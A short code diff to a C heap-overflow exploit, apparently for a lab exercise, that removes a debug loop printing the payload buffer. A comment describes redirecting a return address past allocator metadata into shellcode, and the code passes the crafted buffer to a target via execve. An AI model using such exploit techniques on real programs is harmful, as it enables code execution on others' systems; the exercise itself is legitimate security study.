@@ -31,7 +31,6 @@ left consolidation is always not possible so dont consider
 when the return addr points to the start of p, let it jumps over the p->s.r and direct to the shellcode
 
 */
-int* intBuf;
 int main(void)
 {
     char *args[3];
@@ -75,12 +74,6 @@ int main(void)
     buf[BUF_SIZE - 1] = '\0';
 
     args[1] = buf;
-
-    intBuf = buf;
-    for (int i = 0; i < BUF_SIZE / 4; i++) {
-        printf("%x ", intBuf[i]);
-    }
-    printf("\n");
 
     if (0 > execve(TARGET, args, env))
         fprintf(stderr, "execve failed.\n");
